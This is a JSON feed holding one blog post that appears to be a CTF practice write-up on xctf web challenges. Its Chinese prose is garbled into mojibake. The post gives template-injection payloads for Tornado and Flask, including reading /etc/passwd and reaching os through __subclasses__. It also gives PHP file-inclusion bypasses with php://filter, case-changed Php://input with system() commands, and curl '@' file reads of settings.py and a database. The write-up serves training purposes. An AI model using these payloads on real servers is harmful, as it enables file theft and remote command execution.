{
    "version": "https://jsonfeed.org/version/1",
    "title": "StarofEdenğŸŒ¸ â€¢ All posts by \"ctf\" tag",
    "description": "",
    "home_page_url": "https://StarofEden.github.io",
    "items": [
        {
            "id": "https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/",
            "url": "https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/",
            "title": "xctfåˆ·é¢˜",
            "date_published": "2023-04-14T16:00:00.000Z",
            "content_html": "<h1 id=\"æ¨¡æ¿æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#æ¨¡æ¿æ³¨å…¥\">#</a> <strong>æ¨¡æ¿æ³¨å…¥</strong></h1>\n<h2 id=\"tornado-æ¡†æ¶\"><a class=\"markdownIt-Anchor\" href=\"#tornado-æ¡†æ¶\">#</a> Tornado æ¡†æ¶</h2>\n<h3 id=\"çŸ¥è¯†ç‚¹\"><a class=\"markdownIt-Anchor\" href=\"#çŸ¥è¯†ç‚¹\">#</a> çŸ¥è¯†ç‚¹ï¼š</h3>\n<ul>\n<li>render å‡½æ•°ï¼šé€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„æ”¹å˜</li>\n<li>tornado render æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼š</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡&#123;&#123;&#125;&#125;è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</span><br></pre></td></tr></table></figure>\n<h3 id=\"å¾—åˆ°cookie_secretçš„å€¼\"><a class=\"markdownIt-Anchor\" href=\"#å¾—åˆ°cookie_secretçš„å€¼\">#</a> å¾—åˆ° cookie_secret çš„å€¼ï¼š</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><em>handler.settings æ˜¯ tornado æ¡†æ¶çš„ä¸€ä¸ªé™„å±æ–‡ä»¶</em></p>\n<h2 id=\"flasskæ¨¡æ¿æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#flasskæ¨¡æ¿æ³¨å…¥\">#</a> flassk æ¨¡æ¿æ³¨å…¥</h2>\n<h3 id=\"æ€è·¯\"><a class=\"markdownIt-Anchor\" href=\"#æ€è·¯\">#</a> æ€è·¯ï¼š</h3>\n<p>æ‰¾åˆ°çˆ¶ç±» &lt;type â€˜objectâ€™&gt;â€“&gt; å¯»æ‰¾å­ç±»â€“&gt; æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å—ã€‚</p>\n<ul>\n<li>å‡ ä¸ªé­”æœ¯æ–¹æ³•ï¼š</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡</span><br><span class=\"line\">__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</span><br><span class=\"line\">__base__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»</span><br><span class=\"line\">// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„</span><br><span class=\"line\">__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨</span><br><span class=\"line\">__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•</span><br><span class=\"line\">__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</span><br><span class=\"line\">## &#123;&#123;&#125;&#125;:</span><br><span class=\"line\">* ä¼ é€’å˜é‡</span><br><span class=\"line\">* æ‰§è¡Œä¸€äº›ç®€å•è¡¨è¾¾å¼</span><br></pre></td></tr></table></figure>\n<hr>\n<ul>\n<li>\nï¼šæŸ¥çœ‹å…¨å±€å˜é‡\n</li>\n</ul>\n<h3 id=\"æ­¥éª¤\"><a class=\"markdownIt-Anchor\" href=\"#æ­¥éª¤\">#</a> æ­¥éª¤ï¼š</h3>\n<ol>\n<li>å¯»æ‰¾å¯ç”¨å¼•ç”¨</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>æ–‡ä»¶è¯»å–ï¼Œ <code>[40]</code>  æ˜¯ tupe file ç±»å‹å‡ºç°ä½ç½®ï¼ˆä» 0 å¼€å§‹çš„ä½ç½®ï¼‰</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>å‘½ä»¤æ‰§è¡Œ (æœ‰ä¸€ä¸ª &lt;class â€˜site._Printerâ€™&gt; ç±»å‹)</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>[71]</code>  ä¸º &lt;class â€˜site._Printerâ€™&gt; å‡ºç°ä½ç½®</li>\n</ul>\n<h1 id=\"2æ–‡ä»¶include\"><a class=\"markdownIt-Anchor\" href=\"#2æ–‡ä»¶include\">#</a> 2. æ–‡ä»¶ include</h1>\n<ul>\n<li><em>5.10 æ›´æ–°ï¼šå¥½ä¹…æ²¡åˆ·é¢˜äº†ï¼Œåšä¸ª md å¤ä¹ ä¸€ä¸‹</em></li>\n</ul>\n<h3 id=\"file_includeè¿‡æ»¤\"><a class=\"markdownIt-Anchor\" href=\"#file_includeè¿‡æ»¤\">#</a> file_include (è¿‡æ»¤)</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;./check.php&quot;</span>); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;filename&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span>  = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;filename&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>å°è¯•ç”¨ php://filter:</li>\n</ul>\n<blockquote>\n<p>?filename=php://filter/read=convert.base64-encode/reasource=check.php<br>\n å›æ˜¾ &quot;do not hack!&quot;<br>\n é‚£åº”è¯¥æ˜¯è¿‡æ»¤</p>\n</blockquote>\n<ul>\n<li>ä½¿ç”¨è¿‡æ»¤å™¨ convert.* (string.* è¢«è¿‡æ»¤)</li>\n<li>æ„é€  URLï¼š</li>\n</ul>\n<blockquote>\n<p>?filename=php://filter/convert.iconv.a.b/resource=flag.php<br>\n <code>flagå¯èƒ½åœ¨flag.php</code></p>\n</blockquote>\n<ul>\n<li>ä½¿ç”¨ bp å¯¹ a,b è¿›è¡Œçˆ†ç ´ (é›†æŸç‚¸å¼¹)ï¼Œå­—å…¸å¦‚ä¸‹ï¼š</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UCS-4*</span><br><span class=\"line\">UCS-4BE</span><br><span class=\"line\">UCS-4LE*</span><br><span class=\"line\">UCS-2</span><br><span class=\"line\">UCS-2BE</span><br><span class=\"line\">UCS-2LE</span><br><span class=\"line\">UTF-32*</span><br><span class=\"line\">UTF-32BE*</span><br><span class=\"line\">UTF-32LE*</span><br><span class=\"line\">UTF-16*</span><br><span class=\"line\">UTF-16BE*</span><br><span class=\"line\">UTF-16LE*</span><br><span class=\"line\">UTF-7</span><br><span class=\"line\">UTF7-IMAP</span><br><span class=\"line\">UTF-8*</span><br><span class=\"line\">ASCII*</span><br></pre></td></tr></table></figure>\n<h2 id=\"web_php_include\"><a class=\"markdownIt-Anchor\" href=\"#web_php_include\">#</a> web_php_include</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;hello&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$page</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;page&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$page</span>, <span class=\"string\">&quot;php://&quot;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$page</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php://&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$page</span>);<span class=\"comment\">//è¿‡æ»¤äº†php://</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$page</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"çŸ¥è¯†ç‚¹-2\"><a class=\"markdownIt-Anchor\" href=\"#çŸ¥è¯†ç‚¹-2\">#</a> çŸ¥è¯†ç‚¹</h3>\n<ul>\n<li>ç”±é¢˜å¯çŸ¥è¿‡æ»¤äº† php://, è€ƒè™‘ä½¿ç”¨å…¶å®ƒä¼ªåè®®</li>\n<li>ä¼ªåè®®åŒ…æ‹¬ï¼š<br>\n<strong>file åè®®</strong>ï¼š<br>\nallow_url_fopen ï¼šoff/on<br>\nallow_url_includeï¼šoff/on</li>\n</ul>\n<p>file://  <code>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</code> ï¼Œåœ¨ CTF ä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å— allow_url_fopen ä¸ allow_url_include çš„å½±å“ã€‚</p>\n<p><strong>php:// åè®®</strong>:<br>\n ä»… php://inputã€ php://stdinã€ php://memory å’Œ php://temp éœ€è¦å¼€å¯ allow_url_includeã€‚</p>\n<p><strong>data:// åè®®</strong>ï¼šæ»¡è¶³åŒ off æ¡ä»¶</p>\n<ul>\n<li><strong>strstr</strong> å‡½æ•°ï¼š<br>\nå‡½æ•°ç”¨äºåˆ¤æ–­å­—ç¬¦ä¸² str2 æ˜¯å¦æ˜¯ str1 çš„å­ä¸²ã€‚å¦‚æœæ˜¯ï¼Œåˆ™è¯¥å‡½æ•°è¿”å› str1 å­—ç¬¦ä¸²ä» str2 ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®å¼€å§‹åˆ° str1 ç»“å°¾çš„å­—ç¬¦ä¸²ï¼›å¦åˆ™ï¼Œè¿”å› NULLã€‚</li>\n<li>**str_replace ()** å‡½æ•°ï¼š</li>\n</ul>\n<blockquote>\n<p>ä»¥å…¶ä»–å­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚<br>\nä¾‹å¦‚ï¼šæŠŠå­—ç¬¦ä¸² â€œHello world!â€ ä¸­çš„å­—ç¬¦ â€œworldâ€ æ›¿æ¢ä¸º â€œShanghaiâ€ï¼š</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;world&quot;</span>,<span class=\"string\">&quot;Shanghai&quot;</span>,<span class=\"string\">&quot;Hello world!&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>æœ¬é¢˜æ„æ€ä¸ºå½“ä¼ ç»™ page çš„å‚æ•°æœ‰ phpï¼š// æ—¶æ›¿æ¢ä¸ºç©º</p>\n<h3 id=\"è§£é¢˜æ­¥éª¤\"><a class=\"markdownIt-Anchor\" href=\"#è§£é¢˜æ­¥éª¤\">#</a> è§£é¢˜æ­¥éª¤</h3>\n<ol>\n<li>ä½¿ç”¨ phpï¼š//input</li>\n</ol>\n<blockquote>\n<p>æ„é€  URLï¼š?page=Php://input// å¤§å†™ç»•è¿‡<br>\nä½¿ç”¨ bp ä¼ å…¥ï¼š<br>\na=<?php system('ls');?>a</p>\n</blockquote>\n<ul>\n<li>playload:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = &lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"cat\"><a class=\"markdownIt-Anchor\" href=\"#cat\">#</a> cat</h1>\n<ul>\n<li>å¹¶ä¸æ˜¯å‘½ä»¤æ³¨å…¥</li>\n<li>çœ‹ wp å¾—çŸ¥</li>\n</ul>\n<blockquote>\n<p>æœªè¿‡æ»¤å­—ç¬¦åœ¨ url æ ä¸Šä¼šè¢«è¿›è¡Œ url ç¼–ç <br>\nåœ¨ url æ æµ‹è¯•å®½å­—ç¬¦ï¼Œå³ ascii ç è¶…è¿‡ 127 çš„ url ç¼–ç å³å¯ï¼Œä¹Ÿå°±æ˜¯ %81-% ef<br>\n å‘ç°ä»»æ„ä¸€ä¸ªå®½å­—ç¬¦ï¼Œéƒ½ä¼šå‡ºç°æŠ¥é”™ä¿¡æ¯<br>\n<em>è¿™é“é¢˜æœ‰å…³ä¸€ä¸ª djiango ç‰¹æ€§å’Œ php ç‰¹æ€§ï¼Œæ²¡çœ‹æ‡‚ã€‚</em></p>\n</blockquote>\n<ul>\n<li>è§£é¢˜æ­¥éª¤ï¼š<br>\nplayload1ï¼š?url=%80, å‘ç°æŠ¥é”™ï¼Œurl ç¼–ç ä½¿ç”¨çš„æ˜¯ 16 è¿›åˆ¶ï¼Œ80 ä¹Ÿå°±æ˜¯ 128ï¼ŒASCII ç æ˜¯ä» 0-127ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ä¼šæŠ¥é”™ã€‚<br>\n<strong>php ç‰¹æ€§</strong>ï¼š<br>\nWP å¾—çŸ¥ php çš„ curl ç»„ä»¶è¯·æ±‚åŠ ä¸Š @ä¼šè¯»å–æ–‡ä»¶ï¼Œè¯»å– settings.py æ–‡ä»¶è·å–æ•°æ®åº“åç§°</li>\n<li>æ„é€  playload2ï¼š<br>\n?url=@/opt/api/api/settings.py <em>è¯»å–é…ç½®æ–‡ä»¶</em><br>\n Ctrl+f æœç´¢ database</li>\n<li>æ„é€  playload3ï¼š<br>\n?url=@/opt/api/database.sqlite3<br>\n <code>æœç´¢flag/ctfå¯å¾—flag</code> <br>\n <code>æœ€åçš„flagç«Ÿç„¶ä¸åŒ…å«å‰é¢çš„A</code></li>\n</ul>\n",
            "tags": [
                "ctf"
            ]
        }
    ]
}